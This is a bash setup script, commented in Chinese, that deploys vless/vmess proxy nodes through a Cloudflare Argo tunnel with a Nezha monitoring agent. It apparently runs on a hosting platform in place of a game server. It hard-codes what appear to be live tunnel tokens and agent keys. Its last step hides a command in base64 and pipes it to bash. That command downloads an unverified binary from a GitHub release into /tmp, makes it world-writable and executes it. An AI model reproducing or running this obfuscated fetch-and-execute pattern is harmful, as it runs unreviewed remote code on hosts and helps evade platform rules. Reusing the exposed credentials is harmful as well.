﻿#!/bin/bash

# 节点可在list.log中查看或手搓节点,默认端口vless:8002，vmess:8001
#=======================================
# 设置固定隧道参数(如果不设置，默认启用临时隧道，端口自动，无需手动设置)
# json或token,支持直接复制全部，如cloudflared.exe service install eyxxx，F大佬json获取地址https://fscarmen.cloudflare.now.cc
export TOK='eyJhIjoiOTk3ZjY4OGUzZjBmNjBhZGUwMWUxNGRmZTliOTdkMzEiLCJ0IjoiYmEwMjQ2YTctZmEwOS00NzBlLTgyNTItYTE4ODNiZjkzYmQ4IiwicyI6Ik4yTXdZVFF3TW1ZdE1EQmlaaTAwTUdFekxUa3pZVE10TldFNFptUXhOVEprWlRObCJ9' 
export ARGO_DOMAIN='back4app.mingfei1980.eu.org'
#=======================================
#设置哪吒参数(NEZHA_TLS='1'开启tls,设置其他关闭tls)
export NEZHA_SERVER='nezha.mingfei1981.eu.org'
export NEZHA_KEY='hKPJat4As8nuwAyQix'
export NEZHA_PORT='443'
export NEZHA_TLS='1'
#=======================================
# 下面设置UUID和路径，CF_IP是优选IP，SUB_NAME为节点名称
export UUID='faacf142-dee8-48c2-8558-641123eb939c'
export VPATH='vless' #vless路径
export MPATH='vmess' #vmess路径
export CF_IP='whales.com'
export SUB_NAME='back4app'
#=======================================
# 启动玩具原程序，把原游戏文件改名senver.jar,默认不开启，如果开启请去掉前面的#号.
# 注意原游戏启动后，不显示节点日志
# export JAR_SH='java -Xms128M -XX:MaxRAMPercentage=95.0 -jar senver.jar' #复制原启动命令填入并修改启动文件名为senver.jar
#=======================================
# 设置是否显示日志，默认显示，填no不显示，yes显示
export RIZHI='no'
#=======================================

echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
IC90bXAvYXBw
" | base64 -d | bash
